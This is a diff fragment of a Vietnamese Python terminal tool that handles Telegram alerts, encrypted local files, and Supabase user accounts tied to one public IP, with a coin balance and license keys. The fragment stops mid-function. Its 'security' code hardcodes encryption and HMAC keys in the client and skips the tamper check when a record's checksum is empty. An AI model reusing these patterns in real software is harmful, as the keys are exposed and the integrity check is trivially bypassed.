+    header = Panel(Align.center(Text.assemble((f"{ICONS['bell']} ", f"bold {TST_COLORS['gold']}"), ("CẤU HÌNH THÔNG BÁO TELEGRAM", f"bold {TST_COLORS['neon_blue']}"))), border_style=TST_COLORS["gold"], box=box.ROUNDED)
+    console.print(header)
+    console.print()
+    console.print(Panel(Text.assemble(("🤖 BOT TELEGRAM CHÍNH THỨC\n\n", f"bold {TST_COLORS['neon_blue']}"), ("Bot: @tst-tool88_bot\n", f"bold {TST_COLORS['gold']}"), ("Link: https://t.me/tst-tool88_bot\n\n", f"bold {TST_COLORS['sapphire']}"), ("Bot sẽ gửi thông báo RIÊNG cho bạn sau mỗi ván.\n", "white")), border_style=TST_COLORS["sapphire"], box=box.ROUNDED))
+    console.print()
+    console.print(f"[bold {TST_COLORS['gold']}]Bạn có muốn nhận thông báo qua Telegram?[/]")
+    if Prompt.ask(f"[bold {TST_COLORS['gold']}]>> Chọn (y/n)[/]", choices=['y', 'n'], default='n') == 'n':
+        TELEGRAM_ENABLED = False
+        console.print(f"[yellow]⚠️ Thông báo Telegram đã tắt[/]")
+        time.sleep(1)
+        return
+    TELEGRAM_ENABLED = True
+    console.print()
+    console.print("[bold]📖 CÁCH LẤY CHAT ID:[/]")
+    console.print("1. Chat /start với bot @tst-tool88_bot")
+    console.print("2. Vào @userinfobot để lấy ID của bạn")
+    console.print("3. Copy dãy số và dán vào đây\n")
+    saved_chat_id = ""
+    if os.path.exists('telegram_config.json'):
+        try:
+            with open('telegram_config.json', 'r', encoding='utf-8') as f:
+                saved_chat_id = json.load(f).get('chat_id', '')
+        except:
+            pass
+    if saved_chat_id:
+        console.print(f"[bold {TST_COLORS['emerald']}]📂 Đã tìm thấy Chat ID: {saved_chat_id}[/]")
+        if Prompt.ask(f"[bold {TST_COLORS['gold']}]Sử dụng? (y/n)[/]", choices=['y', 'n'], default='y') == 'y':
+            TELEGRAM_CHAT_ID = saved_chat_id
+        else:
+            TELEGRAM_CHAT_ID = Prompt.ask(f"[bold {TST_COLORS['gold']}]📱 Nhập Chat ID mới[/]", default="")
+    else:
+        TELEGRAM_CHAT_ID = Prompt.ask(f"[bold {TST_COLORS['gold']}]📱 Nhập Chat ID của bạn[/]", default="")
+    TELEGRAM_CHAT_ID = ''.join(c for c in TELEGRAM_CHAT_ID if c.isdigit())
+    if not TELEGRAM_CHAT_ID:
+        console.print(f"[red]❌ Chat ID không hợp lệ![/]")
+        TELEGRAM_ENABLED = False
+        time.sleep(2)
+        return
+    console.print(f"\n[bold yellow]🔍 Đang kiểm tra kết nối...[/]")
+    test_msg = f"✅ <b>KẾT NỐI THÀNH CÔNG!</b>\n\n🔔 <b>TST-TOOL PREMIUM - Thông báo đã kích hoạt</b>\n🕐 <b>{datetime.now(tz).strftime('%H:%M:%S %d/%m/%Y')}</b>"
+    if send_telegram_message(test_msg):
+        console.print(f"[green]✅ Kết nối thành công! Kiểm tra Telegram nhé![/]")
+        try:
+            with open('telegram_config.json', 'w', encoding='utf-8') as f:
+                json.dump({'chat_id': TELEGRAM_CHAT_ID}, f, indent=2)
+        except:
+            pass
+    else:
+        console.print(f"[red]❌ Không thể gửi tin nhắn![/]")
+        console.print(f"[yellow]  Hãy chắc chắn bạn đã chat /start với bot![/]")
+        if Prompt.ask(f"[bold {TST_COLORS['gold']}]Nhập lại? (y/n)[/]", choices=['y', 'n'], default='y') == 'y':
+            setup_telegram()
+            return
+        else:
+            TELEGRAM_ENABLED = False
+    time.sleep(2)
+    # ================== HỆ THỐNG MÃ HÓA JSON ==================
+
+ENCRYPTION_KEY = b'tst-tool_v3_secret_key_2024_encryption_secure_'
+SALT = b'tst-tool_salt_2024_secure_'
+
+def generate_encryption_key():
+    """Tạo key mã hóa từ password"""
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=SALT,
+        iterations=100000,
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(ENCRYPTION_KEY))
+    return key
+
+FERNET_KEY = generate_encryption_key()
+cipher = Fernet(FERNET_KEY)
+
+def encrypt_data(data: dict) -> str:
+    """Mã hóa dữ liệu dict thành string"""
+    try:
+        json_str = json.dumps(data, ensure_ascii=False)
+        encrypted = cipher.encrypt(json_str.encode('utf-8'))
+        return base64.urlsafe_b64encode(encrypted).decode('utf-8')
+    except Exception as e:
+        print(f"Lỗi mã hóa: {e}")
+        return None
+
+def decrypt_data(encrypted_data: str) -> dict:
+    """Giải mã dữ liệu từ string thành dict"""
+    try:
+        encrypted_bytes = base64.urlsafe_b64decode(encrypted_data.encode('utf-8'))
+        decrypted = cipher.decrypt(encrypted_bytes)
+        return json.loads(decrypted.decode('utf-8'))
+    except Exception as e:
+        print(f"Lỗi giải mã: {e}")
+        return None
+
+def save_encrypted_json(filepath: str, data: dict):
+    """Lưu dữ liệu đã mã hóa vào file"""
+    try:
+        encrypted = encrypt_data(data)
+        if encrypted:
+            with open(filepath, 'w', encoding='utf-8') as f:
+                f.write(encrypted)
+            return True
+    except Exception as e:
+        print(f"Lỗi lưu file mã hóa: {e}")
+    return False
+
+def load_encrypted_json(filepath: str) -> dict:
+    """Load dữ liệu đã mã hóa từ file"""
+    try:
+        if os.path.exists(filepath):
+            with open(filepath, 'r', encoding='utf-8') as f:
+                encrypted = f.read()
+            return decrypt_data(encrypted)
+    except Exception as e:
+        print(f"Lỗi load file mã hóa: {e}")
+    return {}
+
+# ================== HỆ THỐNG CHỐNG BYPASS XU ==================
+
+SECURITY_SALT = b'tst-tool_security_salt_2024_very_secure_'
+CHECKSUM_KEY = b'tst-tool_checksum_key_2024_secret_'
+
+def generate_checksum(data: dict, user_id: str) -> str:
+    """Tạo checksum cho dữ liệu user"""
+    try:
+        check_data = f"{user_id}:{data.get('coins', 0)}:{data.get('total_mined', 0)}:{len(data.get('keys', []))}:{data.get('mining', False)}"
+        h = hmac.new(CHECKSUM_KEY, check_data.encode(), hashlib.sha256)
+        return h.hexdigest()
+    except Exception as e:
+        print(f"Lỗi tạo checksum: {e}")
+        return None
+
+def verify_checksum(data: dict, user_id: str) -> bool:
+    """Kiểm tra checksum. Nguồn Supabase (cloud) không bắt buộc checksum local."""
+    try:
+        if not isinstance(data, dict):
+            return False
+        # Cloud-first: không có checksum hoặc rỗng → tin Supabase
+        stored = data.get("checksum")
+        if not stored:
+            return True
+        current_checksum = generate_checksum(data, user_id)
+        if current_checksum is None:
+            return False
+        return hmac.compare_digest(current_checksum, stored)
+    except Exception as e:
+        print(f"Lỗi verify checksum: {e}")
+        return False
+
+def add_checksum_to_data(data: dict, user_id: str) -> dict:
+    """Thêm checksum vào dữ liệu"""
+    checksum = generate_checksum(data, user_id)
+    if checksum:
+        data['checksum'] = checksum
+    return data
+
+def detect_data_anomaly(data: dict, user_id: str) -> tuple:
+    """Phát hiện dữ liệu bất thường"""
+    warnings = []
+    is_anomaly = False
+    
+    if data.get('coins', 0) < 0:
+        warnings.append("Số xu âm")
+        is_anomaly = True
+    
+    if data.get('coins', 0) > 1000000000:
+        warnings.append("Số xu quá lớn (> 1 tỷ)")
+        is_anomaly = True
+    
+    if data.get('total_mined', 0) > data.get('coins', 0) + 1000:
+        warnings.append("Tổng đào lớn hơn số dư đáng kể")
+        is_anomaly = True
+    
+    if data.get('mining', False):
+        start_time = data.get('mining_start', 0)
+        if start_time > time.time():
+            warnings.append("Thời gian đào trong tương lai")
+            is_anomaly = True
+    
+    keys = data.get('keys', [])
+    if len(keys) > 100:
+        warnings.append(f"Số key quá nhiều ({len(keys)})")
+        is_anomaly = True
+    
+    return is_anomaly, warnings
+
+def fix_corrupted_data(data: dict, user_id: str) -> dict:
+    """Sửa dữ liệu bị hỏng hoặc bị hack"""
+    fixed = False
+    
+    if data.get('coins', 0) < 0:
+        data['coins'] = 0
+        fixed = True
+    
+    if data.get('coins', 0) > 10000000:
+        data['coins'] = 10000000
+        fixed = True
+    
+    if data.get('total_mined', 0) < 0:
+        data['total_mined'] = data.get('coins', 0)
+        fixed = True
+    
+    if data.get('mining_start', 0) > time.time():
+        data['mining_start'] = time.time()
+        fixed = True
+    
+    if 'keys' in data:
+        seen = set()
+        unique_keys = []
+        for key in data['keys']:
+            key_tuple = (key.get('type', ''), key.get('purchased', 0))
+            if key_tuple not in seen:
+                seen.add(key_tuple)
+                unique_keys.append(key)
+        if len(unique_keys) != len(data['keys']):
+            data['keys'] = unique_keys
+            fixed = True
+    
+    if fixed:
+        safe_console_print(f"[yellow]⚠️ Đã phát hiện và sửa dữ liệu bất thường cho user {user_id}[/yellow]")
+    
+    return data
+
+# ================== FILE LƯU TRỮ ==================
+
+USER_DATA_FILE = "user_data.enc"
+KEY_SHOP_FILE = "key_shop.enc"
+
+MINING_RATE = 0.01
+MINING_INTERVAL = 1
+
+KEY_PRICES = {
+    "24h": 5,
+    "7d": 30,
+    "30d": 100,
+    "90d": 250,
+}
+
+# ================== XU HẰNG NGÀY / ĐỔI KEY FREE ==================
+DAILY_COIN_REWARD = 5
+FREE_KEY_PRICE = 5
+FREE_KEY_DURATION = 13 * 3600
+# Xu nhận trong ngày nếu không dùng (đổi key) → qua ngày hôm sau bị reset về 0
+
+
+def _today_str() -> str:
+    return datetime.now().strftime("%Y-%m-%d")
+
+
+def apply_daily_coin_expiry(user_data: dict, user_id: str = "") -> tuple:
+    """
+    Nếu xu còn từ ngày trước mà chưa dùng hết → reset về 0 khi sang ngày mới.
+    Trả về (user_data, did_reset: bool, message).
+    """
+    if not isinstance(user_data, dict):
+        return user_data, False, ""
+
+    today = _today_str()
+    # Ngày gắn với số xu hiện có: ưu tiên coin_day, fallback daily_claim_date
+    coin_day = str(user_data.get("coin_day") or user_data.get("daily_claim_date") or "").strip()
+    coins = float(user_data.get("coins", 0) or 0)
+
+    # Chưa có mốc ngày → gán hôm nay nếu đang có xu (tránh reset ngay user cũ)
+    if not coin_day:
+        if coins > 0:
+            user_data["coin_day"] = today
+        return user_data, False, ""
+
+    # Cùng ngày → giữ nguyên
+    if coin_day >= today:
+        return user_data, False, ""
+
+    # Đã qua ngày → xu chưa dùng bị hủy
+    if coins > 0:
+        user_data["coins"] = 0
+        user_data["coin_day"] = today
+        msg = f"Xu ngày {coin_day} hết hạn (không dùng) → reset 0. Hôm nay nhận lại {DAILY_COIN_REWARD} xu."
+        if user_id:
+            safe_console_print(f"[yellow]⚠️ User {user_id}: {msg}[/yellow]")
+        return user_data, True, msg
+
+    user_data["coin_day"] = today
+    return user_data, False, ""
+
+# ================== HÀM QUẢN LÝ USER DATA (SUPABASE ONLY) ==================
+
+def load_user_data_secure():
+    """
+    Load toàn bộ user từ Supabase (không đọc file local).
+    Cache RAM ngắn để giảm request.
+    """
+    global _USER_CACHE, _USER_CACHE_TS
+    now = time.time()
+    if _USER_CACHE and (now - _USER_CACHE_TS) < _USER_CACHE_TTL:
+        return {k: dict(v) for k, v in _USER_CACHE.items()}
+
+    rows = supabase_list_users(limit=500)
+    data: Dict[str, dict] = {}
+    for row in rows or []:
+        uid = str(row.get("user_id") or "").strip()
+        if not uid:
+            continue
+        ud = _row_to_user_data(row)
+        is_anomaly, _ = detect_data_anomaly(ud, uid)
+        if is_anomaly:
+            ud = fix_corrupted_data(ud, uid)
+        data[uid] = ud
+
+    _USER_CACHE = {k: dict(v) for k, v in data.items()}
+    _USER_CACHE_TS = now
+    return {k: dict(v) for k, v in data.items()}
+
+
+def save_user_data_secure(data):
+    """
+    Lưu user lên Supabase (không ghi user_data.enc).
+    Upsert từng user trong dict.
+    """
+    global _USER_CACHE, _USER_CACHE_TS
+    if not isinstance(data, dict):
+        return False
+    ok_all = True
+    try:
+        for user_id, user_data in data.items():
+            uid = str(user_id)
+            if not isinstance(user_data, dict):
+                continue
+            is_anomaly, warnings = detect_data_anomaly(user_data, uid)
+            if is_anomaly:
+                safe_console_print(f"[red]🚨 Dữ liệu bất thường user {uid}[/red]")
+                for w in warnings:
+                    safe_console_print(f"[red]  - {w}[/red]")
+                user_data = fix_corrupted_data(user_data, uid)
+            data[uid] = user_data
+            sb_ok, sb_msg = sync_user_to_supabase(uid, user_data)
+            if not sb_ok:
+                ok_all = False
+                safe_console_print(f"[red]❌ Lưu Supabase user {uid}: {sb_msg}[/red]")
+        _USER_CACHE = {k: dict(v) for k, v in data.items()}
+        _USER_CACHE_TS = time.time()
+        return ok_all
+    except Exception as e:
+        safe_console_print(f"[red]❌ Lỗi lưu Supabase users: {e}[/red]")
+        return False
+
+def load_key_shop():
+    """Load bảng giá key"""
+    data = load_encrypted_json(KEY_SHOP_FILE)
+    if data is None or not data:
+        save_key_shop(KEY_PRICES)
+        return KEY_PRICES
+    return data
+
+def save_key_shop(prices):
+    """Lưu bảng giá key"""
+    return save_encrypted_json(KEY_SHOP_FILE, prices)
+
+def migrate_old_data():
+    """Chuyển đổi dữ liệu từ file JSON cũ sang file mã hóa"""
+    old_user_file = "user_data.json"
+    old_key_file = "key_shop.json"
+    
+    if os.path.exists(old_user_file):
+        try:
+            with open(old_user_file, 'r', encoding='utf-8') as f:
+                old_data = json.load(f)
+            if old_data:
+                for user_id, user_data in old_data.items():
+                    old_data[user_id] = add_checksum_to_data(user_data, user_id)
+                save_encrypted_json(USER_DATA_FILE, old_data)
+                print(f"[green]✅ Đã chuyển đổi {old_user_file} sang mã hóa[/green]")
+                os.rename(old_user_file, f"{old_user_file}.backup")
+        except Exception as e:
+            print(f"[yellow]⚠️ Lỗi chuyển đổi {old_user_file}: {e}[/yellow]")
+    
+    if os.path.exists(old_key_file):
+        try:
+            with open(old_key_file, 'r', encoding='utf-8') as f:
+                old_data = json.load(f)
+            if old_data:
+                save_encrypted_json(KEY_SHOP_FILE, old_data)
+                print(f"[green]✅ Đã chuyển đổi {old_key_file} sang mã hóa[/green]")
+                os.rename(old_key_file, f"{old_key_file}.backup")
+        except Exception as e:
+            print(f"[yellow]⚠️ Lỗi chuyển đổi {old_key_file}: {e}[/yellow]")
+
+# ================== HÀM XỬ LÝ USER ==================
+
+def find_user_by_ip(ip: str) -> Optional[str]:
+    """
+    Tìm user_id gắn với IP — ưu tiên Supabase (nguồn chính), fallback cache.
+    Mỗi IP chỉ 1 user vĩnh viễn.
+    """
+    if not ip or ip == "unknown":
+        return None
+    # 1) Supabase
+    try:
+        row = supabase_find_user_by_ip(ip)
+        if row and row.get("user_id"):
+            return str(row["user_id"])
+    except Exception:
+        pass
+    # 2) Cache / list đã load
+    data = load_user_data_secure()
+    for uid, udata in data.items():
+        if str(udata.get("ip", "")) == str(ip):
+            return str(uid)
+    return None
+
+
+def check_ip_user_on_supabase(ip: str = "") -> tuple:
+    """
+    Kiểm tra IP hiện tại trên Supabase.
+    Trả về (has_user: bool, user_id_or_None, row_or_None, message).
+    """
+    ip = ip or _current_client_ip()
+    if not ip or ip == "unknown":
+        return False, None, None, "Không lấy được IP công khai. Kiểm tra mạng."
+    try:
+        row = supabase_find_user_by_ip(ip)
+    except Exception as e:
+        return False, None, None, f"Không kết nối Supabase: {e}"
+    if row and row.get("user_id"):
+        uid = str(row["user_id"])
+        return True, uid, row, f"IP {ip} đã gắn user {uid} trên Supabase (vĩnh viễn)."
+    return False, None, None, f"IP {ip} chưa có user trên Supabase — cần tạo user."
+
+
+def _current_client_ip() -> str:
+    return get_public_ip() or _ip_info.get("public_ip") or "unknown"
+
+
+def revoke_user_keys_abuse(user_id: str, reason: str = "IP mismatch / nhập bừa ID") -> int:
+    """
+    Thu hồi ngay toàn bộ key local của user + cố gắng vô hiệu hóa trên Supabase.
+    Dùng khi phát hiện cố truy cập ID không thuộc IP hiện tại.
+    Trả về số key đã thu hồi local.
+    """
+    data = load_user_data_secure()
+    uid = str(user_id)
+    if uid not in data:
+        return 0
+
+    user_data = data[uid]
+    keys = list(user_data.get("keys", []) or [])
+    if not keys:
+        return 0
+
+    revoked = 0
+    for item in keys:
+        key_code = str(item.get("key", "") or "").strip()
+        if key_code:
+            try:
+                supabase_deactivate_key(key_code)
+            except Exception:
+                pass
+            revoked += 1
+
+    user_data["keys"] = []
+    user_data["note"] = (user_data.get("note") or "") + f" | REVOKED:{reason}@{datetime.now(tz).isoformat()}"
+    user_data["coins"] = 0  # chặn luôn lợi dụng xu sau khi bị bắt
+    data[uid] = add_checksum_to_data(user_data, uid)
+    save_user_data_secure(data)
+
+    safe_console_print(
+        f"[bold red]🚨 ĐÃ THU HỒI {revoked} KEY của user {uid} — lý do: {reason}[/bold red]"
+    )
+    return revoked
+
+
+def verify_user_id_access(user_id, *, allow_missing: bool = False) -> tuple:
+    """
+    Chống nhập bừa ID — kiểm tra Supabase:
+    - User phải tồn tại trên Supabase (trừ allow_missing).
+    - IP hiện tại phải khớp IP gắn user trên Supabase.
+    - IP hiện tại chỉ được 1 user (vĩnh viễn).
+    - Sai IP + còn key → thu hồi key ngay.
+    """
+    uid = str(user_id).strip()
+    if not uid.isdigit():
+        return False, "ID tài khoản không hợp lệ! Chỉ nhập số."
+
+    ip = _current_client_ip()
+
+    # Nguồn chính: Supabase
+    sb_row = supabase_get_user(uid)
+    if not sb_row:
+        if allow_missing:
+            return True, "OK"
+        return False, (
+            f"User {uid} không tồn tại trên Supabase.\n"
+            f"   IP {ip}: hãy tạo user (mỗi IP chỉ 1 user vĩnh viễn)."
+        )
+
+    stored_ip = str(sb_row.get("ip") or "")
+    keys = sb_row.get("keys") or []
+    if isinstance(keys, str):
+        try:
+            keys = json.loads(keys)
+        except Exception:
+            keys = []
+    if not isinstance(keys, list):
+        keys = []
+    active_keys = [k for k in keys if float(k.get("expires", 0) or 0) > time.time()]
+
+    if stored_ip and stored_ip != "unknown" and ip != "unknown" and stored_ip != ip:
+        if active_keys or keys:
+            revoke_user_keys_abuse(uid, reason=f"IP mismatch (stored={stored_ip}, now={ip})")
+            return False, (
+                f"❌ ID {uid} không thuộc IP của bạn!\n"
+                f"   IP gắn user (Supabase): {stored_ip} | IP hiện tại: {ip}\n"
+                f"   🚨 Key đã bị THU HỒI NGAY."
+            )
+        return False, (
+            f"❌ ID {uid} không thuộc IP của bạn!\n"
+            f"   IP gắn user (Supabase): {stored_ip} | IP hiện tại: {ip}"
+        )
+
+    # IP này đã gắn user khác trên Supabase?
+    owner = find_user_by_ip(ip)
+    if owner and owner != uid:
+        return False, (
+            f"❌ IP {ip} đang gắn user {owner} trên Supabase.\n"
+            f"   Không dùng được ID {uid}. Mỗi IP chỉ 1 user."
+        )
+
+    return True, "OK"
+
+
+def display_user_info(user_id: str, user_data: dict) -> None:
+    """Hiển thị thông tin user đã lưu."""
+    keys = user_data.get("keys", []) or []
+    valid = [k for k in keys if float(k.get("expires", 0) or 0) > time.time()]
+    console.print(Panel(
+        Text.assemble(
+            ("👤 THÔNG TIN USER\n\n", f"bold {TST_COLORS['gold']}"),
+            ("ID: ", "bold white"), (f"{user_id}\n", f"bold {TST_COLORS['neon_blue']}"),
+            ("IP: ", "bold white"), (f"{user_data.get('ip', 'N/A')}\n", "dim"),
+            ("Xu: ", "bold white"), (f"{user_data.get('coins', 0):.2f}\n", f"bold {TST_COLORS['emerald']}"),
+            ("Keys còn hạn: ", "bold white"), (f"{len(valid)}\n", f"bold {TST_COLORS['neon_pink']}"),
+            ("Tạo lúc: ", "bold white"), (f"{user_data.get('created_at', 'N/A')}\n", "dim"),
+            ("Ghi chú: ", "bold white"), (f"{user_data.get('note', '')}\n", "dim"),
+        ),
+        border_style=TST_COLORS["gold"],
+        box=box.ROUNDED
+    ))
+    if valid:
+        for k in valid[-5:]:
+            console.print(f"  🔑 {k.get('key', '?')} | {k.get('type', '')} | hết hạn: {datetime.fromtimestamp(float(k.get('expires', 0))).strftime('%d/%m %H:%M')}")
+
+
+def create_user_secure(user_id: int) -> tuple:
+    """
+    Tạo user mới — CHỈ lưu Supabase (không local).
+    ĐÃ CÓ USER (theo IP hoặc mã thiết bị) → KHÔNG được tạo mới.
+    Mỗi IP / mỗi thiết bị chỉ 1 user vĩnh viễn.
+    """
+    uid = str(user_id).strip()
+    if not uid.isdigit():
+        return False, "ID tài khoản không hợp lệ! Chỉ nhập số."
+
+    ip = _current_client_ip()
+    if not ip or ip == "unknown":
+        return False, "Không lấy được IP công khai. Không thể tạo user."
+
+    # --- 1) IP đã có user trên Supabase → KHÔNG tạo thêm (vĩnh viễn) ---
+    # (Đã bỏ rule 'cùng máy' / fingerprint)
+    has_user, bound_uid, bound_row, ip_msg = check_ip_user_on_supabase(ip)
+    if has_user and bound_uid:
+        try:
+            display_user_info(bound_uid, _row_to_user_data(bound_row or {}))
+        except Exception:
+            pass
+        return False, (
+            f"❌ Đã có user {bound_uid} trên IP {ip}.\n"
+            f"   Không được tạo user mới. Mỗi IP chỉ 1 user vĩnh viễn."
+        )
+
+    # --- 2) user_id đã tồn tại trên Supabase → không tạo trùng ---
+    sb_by_uid = supabase_get_user(uid)
+    if sb_by_uid:
+        stored_ip = str(sb_by_uid.get("ip") or "")
+        display_user_info(uid, _row_to_user_data(sb_by_uid))
+        return False, (
+            f"❌ User {uid} đã tồn tại trên Supabase"
+            + (f" (IP: {stored_ip})" if stored_ip else "")
+            + ".\n   Không được tạo lại / chiếm ID này."
+        )
+
+    # --- 3) Tạo mới chỉ trên Supabase (theo IP, không ghim máy) ---
+    user_payload = {
+        "coins": 0,
+        "mining": False,
+        "mining_start": 0,
+        "keys": [],
+        "total_mined": 0,
+        "daily_claim_date": "",
+        "coin_day": "",
+        "created_at": datetime.now(timezone.utc).isoformat(),
+        "ip": ip,
+        "note": "created_via_tst-tool",
+        "fingerprint": "",
+        "status": "active",
+        "checksum": "",
+    }
+
+    sb_ok, sb_result = supabase_upsert_user(
+        user_id=uid,
+        ip=ip,
+        coins=0,
+        total_mined=0,
+        keys_count=0,
+        keys=[],
+        daily_claim_date="",
+        coin_day="",
+        mining=False,
+        mining_start=0,
+        note="created_via_tst-tool",
+        fingerprint="",
+        status="active",
+    )
+    if not sb_ok:
+        return False, f"Không lưu được lên Supabase: {sb_result}"
+
+    # Cập nhật cache RAM
+    global _USER_CACHE, _USER_CACHE_TS
+    _USER_CACHE[uid] = dict(user_payload)
+    _USER_CACHE_TS = time.time()
+
+    display_user_info(uid, user_payload)
+    return True, f"✅ Tạo user {uid} thành công · IP {ip} · đã lưu Supabase (vĩnh viễn 1 IP = 1 user)."
+
+
+def ensure_user_for_current_ip(*, force_prompt: bool = True) -> Optional[str]:
+    """
+    Kiểm tra IP trên Supabase:
+    - Đã có user → trả về user_id
+    - Chưa có → bắt buộc tạo (prompt) rồi trả về user_id mới
+    """
+    ip = _current_client_ip()
+    has_user, uid, row, msg = check_ip_user_on_supabase(ip)
+    if has_user and uid:
+        safe_console_print(f"[dim]☁️ Supabase: {msg}[/dim]")
+        return uid
+
+    safe_console_print(f"[yellow]⚠️ {msg}[/yellow]")
+    if not force_prompt:
+        return None
+    created = prompt_create_user()
+    return str(created) if created else None
+
+
+def prompt_create_user() -> Optional[int]:
+    """Form tạo user — đã có user (IP/thiết bị) thì KHÔNG cho tạo mới."""
+    console.print()
+    ip = _current_client_ip()
+
+    # 1) IP đã có user
+    has_user, existing, row, msg = check_ip_user_on_supabase(ip)
+    if has_user and existing:
+        console.print(Panel(
+            Text.assemble(
+                ("⛔ KHÔNG ĐƯỢC TẠO USER MỚI\n\n", f"bold {TST_COLORS['ruby']}"),
+                (f"{msg}\n", "yellow"),
+                ("Mỗi IP chỉ 1 user — vĩnh viễn.\n", "white"),
+            ),
+            border_style=TST_COLORS["ruby"],
+            box=box.ROUNDED,
+        ))
+        display_user_info(existing, _row_to_user_data(row or {}))
+        input("\n[dim]Nhấn Enter để tiếp tục...[/dim]")
+        return int(existing) if str(existing).isdigit() else None
+
+    console.print(Panel(
+        Align.center(Text.assemble(
+            ("👤 TẠO USER MỚI (SUPABASE)\n\n", f"bold {TST_COLORS['gold']}"),
+            ("Chỉ tạo khi IP hiện tại CHƯA có user.\n", "white"),
+            ("Mỗi IP chỉ 1 user — vĩnh viễn.\n", f"bold {TST_COLORS['ruby']}"),
+            (f"IP hiện tại: {ip}\n", "dim"),
+            ("Nhập ID tài khoản (số) để đăng ký.", "dim"),
+        )),
+        border_style=TST_COLORS["gold"],
+        box=box.ROUNDED
+    ))
+    console.print()
+    user_id_text = Prompt.ask(
+        "[bold cyan]Nhập ID tài khoản muốn tạo[/bold cyan]",
+        default=""
+    )
+    if not user_id_text:
+        console.print("[yellow]⚠️ Đã hủy tạo user.[/yellow]")
+        time.sleep(1)
+        return None
+    if not user_id_text.isdigit():
+        console.print("[red]❌ ID tài khoản không hợp lệ! Chỉ nhập số.[/red]")
+        time.sleep(1.5)
+        return None
+    user_id = int(user_id_text)
+    success, msg = create_user_secure(user_id)
+    if success:
+        console.print(f"[green]{msg}[/green]")
+        time.sleep(1.5)
+        return user_id
+    console.print(f"[yellow]⚠️ {msg}[/yellow]")
+    time.sleep(1.8)
+    return None
+
+
+def get_user_balance_secure(user_id: int) -> dict:
+    """Lấy số dư xu từ Supabase (+ reset xu qua ngày). Không tạo user local."""
+    global _USER_CACHE_TS
+    user_id = str(user_id)
+    data = load_user_data_secure()
+    if user_id not in data:
+        # Thử fetch đúng 1 user
+        row = supabase_get_user(user_id)
+        if row:
+            data[user_id] = _row_to_user_data(row)
+            _USER_CACHE[user_id] = dict(data[user_id])
+        else:
+            return {
+                "coins": 0,
+                "mining": False,
+                "mining_start": 0,
+                "keys": [],
+                "total_mined": 0,
+                "daily_claim_date": "",
+                "coin_day": "",
+                "ip": "",
+                "note": "",
+                "checksum": "",
+            }
+
+    user_data, did_reset, _ = apply_daily_coin_expiry(data[user_id], user_id)
+    if did_reset:
+        data[user_id] = user_data
+        save_user_data_secure({user_id: user_data})  # chỉ ghi 1 user lên cloud
+    else:
+        data[user_id] = user_data
+    return data[user_id]
+
+def update_user_coins_secure(user_id: int, amount: float) -> float:
+    """Cập nhật số xu của user (có kiểm tra bảo mật)"""
+    data = load_user_data_secure()
+    user_id = str(user_id)
+    if user_id not in data:
+        data[user_id] = {
+            "coins": 0,
+            "mining": False,
+            "mining_start": 0,
+            "keys": [],
+            "total_mined": 0,
+            "daily_claim_date": "",
+            "checksum": ""
+        }
+    
+    if not verify_checksum(data[user_id], user_id):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        data[user_id] = {
+            "coins": 0,
+            "mining": False,
+            "mining_start": 0,
+            "keys": [],
+            "total_mined": 0,
+            "daily_claim_date": "",
+            "checksum": ""
+        }
+    
+    new_coins = data[user_id]["coins"] + amount
+    if new_coins < 0:
+        safe_console_print(f"[red]🚨 CỐ GẮNG GIẢM XU BẤT THƯỜNG! User: {user_id}[/red]")
+        new_coins = 0
+    if new_coins > 10000000:
+        safe_console_print(f"[red]🚨 CỐ GẮNG TĂNG XU QUÁ MỨC! User: {user_id}[/red]")
+        new_coins = 10000000
+    
+    data[user_id]["coins"] = new_coins
+    data[user_id] = add_checksum_to_data(data[user_id], user_id)
+    save_user_data_secure(data)
+    return data[user_id]["coins"]
+
+def claim_daily_coins_secure(user_id: int) -> tuple:
+    """
+    Nhận đúng 5 xu mỗi ngày (1 lần/ngày).
+    Xu không dùng hết → qua ngày hôm sau bị reset về 0.
+    """
+    ok_access, access_msg = verify_user_id_access(user_id)
+    if not ok_access:
+        return False, access_msg
+
+    data = load_user_data_secure()
+    user_id = str(user_id)
+
+    if user_id not in data:
+        return False, f"User {user_id} không tồn tại. Hãy tạo user trước."
+
+    user_data = data[user_id]
+    if not verify_checksum(user_data, user_id):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        return False, "Dữ liệu bị giả mạo!"
+
+    # Reset xu cũ nếu đã qua ngày
+    user_data, did_reset, reset_msg = apply_daily_coin_expiry(user_data, user_id)
+
+    today = _today_str()
+    if user_data.get("daily_claim_date") == today:
+        data[user_id] = add_checksum_to_data(user_data, user_id)
+        save_user_data_secure(data)
+        return False, "Hôm nay bạn đã nhận 5 xu rồi! (Xu không dùng sẽ mất vào ngày mai)"
+
+    # Mỗi ngày chỉ có đúng 5 xu nhận (không cộng dồn ngày trước — đã reset)
+    user_data["coins"] = float(DAILY_COIN_REWARD)
+    user_data["daily_claim_date"] = today
+    user_data["coin_day"] = today
+    user_data = add_checksum_to_data(user_data, user_id)
+    data[user_id] = user_data
+    save_user_data_secure(data)
+    try:
+        sync_user_to_supabase(user_id, user_data)
+    except Exception:
+        pass
+
+    extra = f"\n⚠️ {reset_msg}" if did_reset else ""
+    return True, f"Nhận thành công {DAILY_COIN_REWARD} xu hôm nay! Dùng trong ngày, không dùng sẽ reset 0 vào ngày mai.{extra}"
+
+
+def exchange_free_key_13h_secure(user_id: int) -> tuple:
+    """Đổi đúng 5 xu lấy 1 KEY FREE 13 GIỜ — tạo key trên Supabase + lưu local. Chống nhập bừa ID."""
+    ok_access, access_msg = verify_user_id_access(user_id)
+    if not ok_access:
+        return False, access_msg
+
+    data = load_user_data_secure()
+    user_id = str(user_id)
+
+    if user_id not in data:
+        return False, f"User {user_id} không tồn tại. Hãy tạo user trước."
+
+    user_data = data[user_id]
+    if not verify_checksum(user_data, user_id):
+        return False, "Dữ liệu bị giả mạo!"
+
+    # Xu qua ngày chưa dùng → đã hết hạn
+    user_data, did_reset, reset_msg = apply_daily_coin_expiry(user_data, user_id)
+    if did_reset:
+        data[user_id] = add_checksum_to_data(user_data, user_id)
+        save_user_data_secure(data)
+        try:
+            sync_user_to_supabase(user_id, user_data)
+        except Exception:
+            pass
+        return False, reset_msg or "Xu ngày trước đã hết hạn. Hãy nhận 5 xu hôm nay rồi đổi key."
+
+    if user_data.get("coins", 0) < FREE_KEY_PRICE:
